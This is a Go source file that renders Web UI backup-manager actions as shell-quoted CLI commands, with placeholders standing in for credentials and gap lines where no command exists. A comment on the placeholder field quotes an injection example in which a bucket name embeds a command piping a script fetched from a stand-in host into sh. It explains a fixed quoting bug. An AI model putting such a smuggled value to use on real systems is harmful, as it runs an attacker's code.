// Package cliecho names the `backup-manager` command that would have done
// the same thing as an action taken in the Web UI (issue #599).
//
// # Why this exists at all
//
// EPIC G requires every capability to exist on both surfaces, and nothing
// enforced it. A UI-only feature is invisible until somebody goes looking,
// and by then it has shipped. If the UI has to NAME the equivalent command
// for every action it performs, an action with no command to name
// announces itself the first time anybody uses the feature: the failure
// mode changes from a silent gap found at an audit nobody runs to a marked
// line in a panel an operator is already reading.
//
// It also teaches the CLI to somebody who started in the browser, which is
// a far shorter path to automation than reading a 191-line usage() block
// for a surface they have never touched. And it makes "send me what the
// terminal said" produce commands rather than a description of which
// buttons were pressed.
//
// # Why it lives in core/ and not beside the UI
//
// A hand-kept table of "this button, that command" next to the frontend
// has nothing compiling against it. The day somebody renames a flag, the
// UI keeps confidently printing the old one, and the feature becomes a
// liar in exactly the place its whole value is being trusted.
//
// Four properties this repository already has make the engine the right
// side of the wire:
//
//   - The correspondence already exists here.
//     core/cmd/backup-manager/engineroute.go maps CLI arguments onto
//     exactly the requests the UI sends. This is that same relation read
//     in the other direction.
//   - The flag spellings are pinned here. core/tests/compat holds usage()
//     against a checked-in corpus, so a reworded or renamed flag is
//     already a test failure. A builder that sits next to it inherits that
//     guard; a TypeScript table inherits nothing.
//   - The redactor is here. obs/redact.go and obs/secret.go run on
//     rendered lines inside the engine. A command composed in a browser
//     has no redactor at all, and this panel is copy-to-clipboard and
//     exportable by design.
//   - The CLI is the thing being described. A second client (a Synology
//     shell, a future TUI) gets the same lines for free, because they are
//     on the wire rather than in one frontend.
//
// # The two tests that make it hold
//
// They are the deliverable as much as the feature is, and neither lives
// here, because neither can: one needs the router and one needs the flag
// sets.
//
//   - apps/common/webhost's TestEveryAPIRouteNamesItsCLIEquivalentOrTheGap
//     walks the registered route table and requires every route to have
//     either a builder or an explicit no-equivalent entry carrying a
//     reason. A route added with neither fails. That is the parity guard.
//   - core/cmd/backup-manager's TestEveryEchoedCommandParses feeds every
//     command this package can emit through the real dispatcher, and
//     requires it not to be a usage error. A renamed flag, a removed one
//     or an argument in the wrong position fails there rather than being
//     printed at an operator who then pastes it and gets exit 2.
//
// # Credentials never appear
//
// A command that would carry a key, a password or a token shows the flag
// with a placeholder in angle brackets and never the value, and the line
// says it is not runnable as printed. The rule is mechanical rather than a
// matter of care at each call site: a builder below reads the request
// fields it names, and no builder names a secret-shaped one.
// TestNoBuilderEverPrintsACredential drives every builder with a body
// carrying every secret-shaped field this contract has and fails if any
// value reaches the argv.
package cliecho

import (
	"encoding/json"
	"net/url"
	"sort"
	"strconv"
	"strings"
)

// Action is one API action, as the request that performed it.
//
// Route is the router's own pattern with the /api/v1 prefix off
// ("/backup-sets/{source}/{set}"), not the concrete path, because the
// pattern is what a route table can be compared against and a concrete
// path is not.
type Action struct {
	Method string
	Route  string
	Params map[string]string
	Query  url.Values
	Body   []byte
}

// Line is what a terminal prints for one action: either a command, or a
// marked, greppable statement that there is no command.
//
// Never both, and never neither. Silence is what this feature exists to
// abolish, so a route with no equivalent says so rather than printing
// nothing, and it names the route, because that is what makes the gap
// actionable: it says which endpoint needs a verb, not just that
// something is missing.
type Line struct {
	// Route is the action's own route, as an operator would find it in
	// the API: "POST /api/v1/backup-sets/test-connection".
	Route string

	// Command is the argv an operator could have typed, starting with
	// "backup-manager", unquoted. Nil when there is no equivalent. Shell
	// below is what goes on the wire; this is what a parser is fed.
	Command []string

	// Gap and GapDetail are why there is no equivalent. Gap is the short
	// form and is empty exactly when Command is not.
	Gap       string
	GapDetail string

	// Placeholder says the command carries a <value in angle brackets>
	// standing in for something this request cannot name on a command
	// line, so the line is not runnable as printed.
	Placeholder bool

	// placeholderAt is the set of Command positions the BUILDER filled
	// with such a stand-in, and it is what Shell reads to decide what not
	// to quote.
	//
	// It is carried here, out of band, rather than being recognised from
	// the text at print time, and that is the whole reason it exists. The
	// renderer used to leave any argument beginning with "<" and ending
	// with ">" unquoted, which let caller-supplied data claim to be a
	// placeholder simply by being shaped like one: a bucket named
	// "<a; curl http://evil.example/ | sh>" rendered as an ordinary
	// runnable command with nothing marking it. No shape test can tell
	// the two apart, because the shape is the caller's to choose; only
	// the builder knows, and now only the builder says.
	//
	// Unexported because it is a fact about how Shell renders, not part
	// of what an action WAS. Placeholder above is the public half, and it
	// is what a client renders "not runnable as printed" from.
	placeholderAt map[int]bool
}

// Shell is the command as one line an operator can paste: the argv,
// shell-quoted, and nothing else. Empty when there is no command.
//
// No "$ " in front of it and no note after it, deliberately. This string
// is what goes on the wire as the event's `command` field and into the
// durable journal, and a field called command carries a command: a script
// reading `activity --json` gets something it can hand to a shell, not a
// screen. The prompt a terminal draws in front of a command and the "# "
// it draws in front of a gap are the terminal's, the same way the
// timestamp and the [actor] prefix are, and they are drawn from the same
// fields by every client (the dock today, `activity --follow` when it
// exists) so the two agree. Whether the line is runnable as printed is
// data too, on command_runnable, rather than a sentence inside this one.
//
// The quoting stays, because it is part of the command and not of the
// display: a known_hosts line has spaces in it, and an argv can only be
// one string if the words that need it are quoted.
func (l Line) Shell() string {
	if len(l.Command) == 0 {
		return ""
	}
	quoted := make([]string, 0, len(l.Command))
	for i, arg := range l.Command {
		if l.placeholderAt[i] {
			// The one thing that goes on the line unquoted, and only
			// because the builder marked this position: the line already
			// says it is not runnable as printed, and
			// '<the file you chose>' reads like a filename somebody could
			// use.
			quoted = append(quoted, arg)
			continue
		}
		quoted = append(quoted, shellQuote(arg))
	}
	return strings.Join(quoted, " ")
}

// gapNoEquivalent is the one wording every gap line uses, so an operator
// and a grep only ever have one string to know.
const gapNoEquivalent = "no backup-manager equivalent yet"

// Echo names the command for one action, or the gap where there is none.
//
// A route this package has never heard of is itself a gap, and a loud one:
// the parity test makes it impossible to add a route without an entry, so
// reaching this branch in production means the table and the router have
// come apart, and saying so is better than printing nothing.
func Echo(a Action) Line {
	line := Line{Route: a.Method + " /api/v1" + strings.TrimSuffix(a.Route, "/")}
	if a.Route == "/" {
		line.Route = a.Method + " /api/v1/"
	}
	e, ok := routes[key(a.Method, a.Route)]
	if !ok {
		line.Gap = gapNoEquivalent
		line.GapDetail = "this route is not in core/cliecho's table, which should be impossible: see TestEveryAPIRouteNamesItsCLIEquivalentOrTheGap"
		return line
	}
	if e.build == nil {
		line.Gap = gapNoEquivalent
		line.GapDetail = e.why
		return line
	}
	c := e.build(a)
	if c == nil {
		// A builder that declines for THIS request rather than for the
		// route: a run_cycle and a restore arrive on the same route and
		// only one of them has a verb.
		line.Gap = gapNoEquivalent
		line.GapDetail = e.why
		return line
	}
	line.Command = c.argv
	line.Placeholder = c.placeholder
	line.placeholderAt = c.placeholderAt
	if c.gap != "" {
		line.Command = nil
		line.Placeholder = false
		line.placeholderAt = nil
		line.Gap = gapNoEquivalent
		line.GapDetail = c.gap
	}
	return line
}

// Routes reports every route this package has an answer for, as
// "METHOD /path" keys. The parity test compares it against the router's
// own table; nothing else should need it.
func Routes() []string {
	out := make([]string, 0, len(routes))
	for k := range routes {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// Examples reports representative actions for every route that has a
// builder, which is what the parse test drives. A route whose builder can
// take more than one shape (a settings patch with capacity fields and one
// with retention fields) carries one example per shape, because a shape
// nobody exercises is a shape nobody has checked.
func Examples() []Action {
	out := make([]Action, 0, 32)
	for k, e := range routes {
		if e.build == nil {
			continue
		}
		method, route, _ := strings.Cut(k, " ")
		for _, ex := range e.examples {
			ex.Method, ex.Route = method, route
			out = append(out, ex)
		}
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Route != out[j].Route {
			return out[i].Route < out[j].Route
		}
		if out[i].Method != out[j].Method {
			return out[i].Method < out[j].Method
		}
		return string(out[i].Body) < string(out[j].Body)
	})
	return out
}

// entry is one route's answer: a builder, or a reason there is none.
// Exactly one of build and why-without-build is set, and the parity test
// is what holds that.
type entry struct {
	build func(Action) *cmd

	// why is the reason there is no command. It is set for a route with
	// no builder at all, and also for a builder that declines on some
	// requests but not others.
	why string

	// examples are the requests the parse test drives this builder with.
	examples []Action
}

func key(method, route string) string { return method + " " + route }

// cmd accumulates one command line. The argv it holds is UNQUOTED: Text
// quotes at print time, and the parse test needs the raw words.
type cmd struct {
	argv        []string
	placeholder bool

	// placeholderAt is which of those argv positions hold a <stand-in>
	// rather than a value, recorded as the builder writes them. See
	// Line.placeholderAt for why this is carried rather than recognised.
	placeholderAt map[int]bool

	// gap turns this build into a gap after the fact, for the case where
	// the request itself is what has no equivalent rather than the route.
	gap string
}

func newCmd(words ...string) *cmd {
	return &cmd{argv: append([]string{"backup-manager"}, words...)}
}

// flag appends --name value.
func (c *cmd) flag(name, value string) *cmd {
	c.argv = append(c.argv, "--"+name, value)
	return c
}

// flagIfSet appends --name value only when there is a value.
//
// It is for a request whose fields are plain strings, where empty is the
// only way to say absent. A create refused for a missing user must not
// echo --user with an empty string after it: that is not "no user", it
// is an empty user, which is a different command from the one that was
// asked for and one that would be refused for a different reason.
// Skipping the field leaves a line that says exactly what the request
// said, and one an operator can fill in and run.
func (c *cmd) flagIfSet(name, value string) *cmd {
	if value == "" {
		return c
	}
	return c.flag(name, value)
}

// bare appends a boolean flag that is only ever passed, never assigned.
func (c *cmd) bare(name string) *cmd {
	c.argv = append(c.argv, "--"+name)
	return c
}

// assigned appends --name=true/false, which is how a boolean flag whose
// default is true has to be turned off on a Go flag set.
func (c *cmd) assigned(name string, v bool) *cmd {
	c.argv = append(c.argv, "--"+name+"="+strconv.FormatBool(v))
	return c
}

// placeholderFlag appends --name <what>, and marks the whole line as not
// runnable as printed. It is how a value that cannot go on a command line
// is shown: a credential, or a file whose contents the request carried
// inline.
func (c *cmd) placeholderFlag(name, what string) *cmd {
	c.argv = append(c.argv, "--"+name, "<"+what+">")
	if c.placeholderAt == nil {
		c.placeholderAt = make(map[int]bool, 1)
	}
	c.placeholderAt[len(c.argv)-1] = true
	c.placeholder = true
	return c
}

func (c *cmd) refuse(why string) *cmd {
	c.gap = why
	return c
}

// setID is the source/set id every verb that names a backup set takes,
// read off the route's own two parameters.
func setID(a Action) string {
	return a.Params["source"] + "/" + a.Params["set"]
}

// artifactID is source/set/name, which is what an artifact id is.
func artifactID(a Action) string {
	return a.Params["source"] + "/" + a.Params["set"] + "/" + a.Params["name"]
}

// decode reads the request body into out. A body that will not decode is
// not an error worth reporting here: the handler that received it will
// have refused the request, and the line beside this one already says so.
func decode(body []byte, out any) bool {
	if len(body) == 0 {
		return false
	}
	return json.Unmarshal(body, out) == nil
}

// seconds renders a duration flag's value the way an operator would type
// it: 172800 seconds is 48h, not 48h0m0s.
//
// It is built out of the hours, minutes and seconds rather than trimmed
// out of time.Duration's own text, and that is the whole point of the
// function. Trimming a two-character "0s" or "0m" off the end cannot tell
// a zero UNIT from the last digit of a value, so it ate a digit from
// every duration whose last component ends in zero: 30 seconds printed as
// "3", 600 as "1", and 3610 as "1h0m1". None of those parse, both flags
// this feeds are flag.Duration, and the two values this package's own
// examples happened to use (300 and 172800) were two of the few that
// survived it, which is why the end-to-end parse test stayed green.
//
// Every component that is zero is left out and every one that is not is
// printed whole, so the output is one of "0s", "10s", "1m30s", "5m",
// "1h", "1h10s" or "26h3m4s", and time.ParseDuration takes all of them
// back as the same number of seconds. seconds_test.go sweeps the range
// rather than sampling it.
func seconds(v int) string {
	if v == 0 {
		return "0s"
	}
	n := int64(v)
	sign := ""
	if n < 0 {
		// A negative freshness budget is not a thing anybody configures,
		// but this renders whatever the request carried rather than
		// asserting about it: the handler beside this line is what
		// refuses a nonsense value, and a line that silently dropped the
		// sign would describe a different request from the one made.
		sign, n = "-", -n
	}
	var b strings.Builder
	b.WriteString(sign)
	if h := n / 3600; h > 0 {
		b.WriteString(strconv.FormatInt(h, 10))
		b.WriteByte('h')
	}
	if m := (n % 3600) / 60; m > 0 {
		b.WriteString(strconv.FormatInt(m, 10))
		b.WriteByte('m')
	}
	if s := n % 60; s > 0 {
		b.WriteString(strconv.FormatInt(s, 10))
		b.WriteByte('s')
	}
	return b.String()
}

// shellQuote makes one argument safe to paste into a shell, and leaves
// alone the ones that need nothing.
//
// It quotes on the CHARACTERS in the string and on nothing else. It used
// to make one exception, for an argument beginning with "<" and ending
// with ">", on the reasoning that such a thing is one of this package's
// own placeholders and '<the file you chose>' reads like a filename
// somebody could use. The exception was right about the display and wrong
// about the decision: it read the text to work out where the text came
// from, and the text is the caller's. Every one of --bucket, --endpoint,
// --prefix, --storage-class, --known-hosts-line, --note, --host, --user,
// --remote-path, --local-path and --include carries a string somebody
// typed into a browser, path parameters carry them too, and a value shaped
// like a placeholder rendered as an ordinary runnable command, on a panel
// with a $ prompt in front of it and a copy button beside it, without even
// being marked not runnable as printed.
//
// A placeholder still renders bare, and Line.Shell is where that now
// happens: the builder records WHICH positions it filled with a stand-in,
// so nothing a caller sends can claim to be one.
func shellQuote(s string) string {
	if s == "" {
		return "''"
	}
	safe := func(r rune) bool {
		return r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' ||
			strings.ContainsRune("_@%+=:,./-", r)
	}
	if strings.IndexFunc(s, func(r rune) bool { return !safe(r) }) < 0 {
		return s
	}
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// What the printed commands need beyond their own argv (the three
// BACKUP_MANAGER_API_* variables usage() names) is deliberately NOT
// composed here. The engine does not know the address the reader would
// type at their own shell to reach it: it knows what it is listening on,
// which behind a reverse proxy or a Synology package is not that. The
// browser does know it, as window.location.origin, and it knows the
// session's own name, so the dock composes that one line itself
// (ui/shared/src/components/ActivityDock.tsx, environmentPreamble). Every
// command line here stays clean of it, which is what makes them pasteable
// under a preamble said once.
